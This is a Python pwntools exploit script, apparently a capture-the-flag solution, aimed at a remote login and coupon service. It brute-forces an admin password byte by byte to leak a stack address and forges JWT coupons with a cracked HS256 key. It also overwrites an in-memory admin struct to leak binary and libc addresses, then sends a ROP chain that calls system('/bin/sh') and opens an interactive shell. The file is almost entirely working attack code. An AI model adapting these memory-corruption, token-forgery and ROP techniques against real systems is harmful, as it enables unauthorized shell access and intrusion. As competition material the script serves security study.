import os
import jwt

os.environ["PWNLIB_NOTERM"] = "1"
from pwn import *
# context.log_level = 'debug'

context.arch = 'amd64'
context.bits = 64
context.newline = b"\r\n"

login_attempt_count = 0
coupon_sample = b""


def login(_id, pw):
    global login_attempt_count
    login_attempt_count += 1
    r.send(b"2\n")
    r.send(_id + b"\n")
    r.recvuntil(b"pw:\r\n")
    r.send(pw + b"\n")
    return b"Login Success" in r.recvuntil(b"\r\n\x1b")


def logout():
    r.recvuntil(b"Choice : \r\n")
    r.send(b"1\n")


def join(_id, pw, email, age):
    global coupon_sample
    global jwt_key
    r.send(b"1\n")
    r.send(_id + b"\n")
    r.send(pw + b"\n")
    r.send(email + b"\n")
    r.recvuntil(b"Age:\r\n")
    r.send(str(age).encode("ascii") + b"\n")
    r.recvuntil(b"sign-up coupon has been issued : ")
    if not coupon_sample:
        coupon_sample = r.recvuntil(b"\r\n").rstrip(b"\r\n")
        jwt_key = (
            os.popen("/home/ubuntu/jinmo/dist/bf/target/release/bf " + coupon_sample.decode())
            .read()
            .strip()
            .encode()
        )



def apply_coupon(coupon):
    r.recvuntil(b"Choice : \r\n")
    r.send(b"3\n")
    r.recvuntil(b"Enter your coupon : \r\n")
    r.send(coupon + b"\n")


count = 0


def generate_coupon():
    global count
    # FIXME
    res = jwt.encode(
        {"iat": int(time.time() - 10000 + count), "iss": "linectf", "userid": "Welcome!"},
        jwt_key,
        algorithm="HS256",
        headers={"alg": "HS256", "typ": "JWS"},
    ).encode()
    count += 1
    return res


def play_game():
    # FIXME
    r.recvuntil(b"Choice : \r\n")
    r.send(b"2\n")
    r.sendline(b'ffffffffffffffffffffff')


def change_pw(pw):
    r.recvuntil(b"Choice : \r\n")
    r.send(b"5\n")
    r.recvuntil(b"PW? : \r\n")
    r.send(b"y\n")
    r.recvuntil(b"New PW : \r\n")
    r.send(pw + b"\n")


def print_info():
    r.recvuntil(b"Choice : \r\n")
    r.send(b"6\n")
    r.recvuntil(b"id :")
    _id = r.recvuntil(b"\r\n")[:-2]
    r.recvuntil(b"age :")
    age = r.recvuntil(b"\r\n")[:-2]
    r.recvuntil(b"email :")
    email = r.recvuntil(b"\r\n")[:-2]
    return _id, age, email


r = remote("35.200.72.53", 9999)

admin_leak = b""

for i in range(0, 24):
    if i < 5:
        _range = range(255, -1, -1)
    elif i == 5:
        _range = range(0x78, 0x7f + 1)
    elif len(admin_leak) >= 16:
        _range = bytearray(string.ascii_letters + string.digits, "ascii")
    else:
        _range = range(0, 256)
    for x in _range:
        print(i, x)
        if login(b"Welcome!", admin_leak + x.to_bytes(1, "little")):
            logout()
            if i != 23:
                join(str(i).encode("ascii"), str(i).encode("ascii"), str(i).encode("ascii"), i)
            print(hex(x), "ok")
            admin_leak += x.to_bytes(1, "little")
            break

print("admin_leak", admin_leak)

stack_leak = u64(admin_leak[:8])
print("stack_leak", hex(stack_leak))
# admin_pw = admin_leak[-8:]
# login(b"admin", admin_pw)

login(b"Welcome!", admin_leak)

for _ in range(7):
    apply_coupon(generate_coupon())
play_game()
r.recvuntil(b"regular member? : \r\n")
r.send(b"y\n")

# overwrite admin pw str
change_pw(flat({
    0x00: p64(stack_leak + 0x30 - 0x40 - 1),  # &admin - 1
    0x08: p64(0x1),
    0x10: p64(0x7fffffff),
}))
logout()

login(b"admin", b"\x00")
# overwrite admin struct
change_pw(b"\x00" + flat({
    0x00: p64(stack_leak + 0x30 - 0x40 - 1),  # &admin - 1
    0x08: p64(0x1),
    0x10: p64(0x7fffffff),
    0x18: p64(0),
}) + flat({
    0x00: p64(stack_leak + 0x30 - 0x40 + 0x20 + 0x18),
    0x08: p64(5),
    0x10: p64(5),
    0x18: b"admin\x00\x00\x00",
}) + flat({
    0x00: p64(stack_leak + 0xd88),
    0x08: p64(0x18),
    0x10: p64(0x7fffffff),
    0x18: p64(0),
}))
leak = print_info()[2]
print(leak)

binary_base = u64(leak[:8]) - 0x23d3e
print("binary_base", hex(binary_base))
libc_base = u64(leak[-8:]) - 0x29d90
print("libc_base", hex(libc_base))

# overwrite admin struct
change_pw(b"\x00" + flat({
    0x00: p64(stack_leak - 0x118),
    0x08: p64(0x7fffffff),
    0x10: p64(0x7fffffff),
}))

raw_input("debug")

change_pw(flat([
    p64(libc_base + 0x000000000002a3e5 + 1),
    p64(libc_base + 0x000000000002a3e5),
    p64(libc_base + 0x1d8678),
    p64(libc_base + 0x50d70)
]))

context.newline = b"\n"
r.interactive()
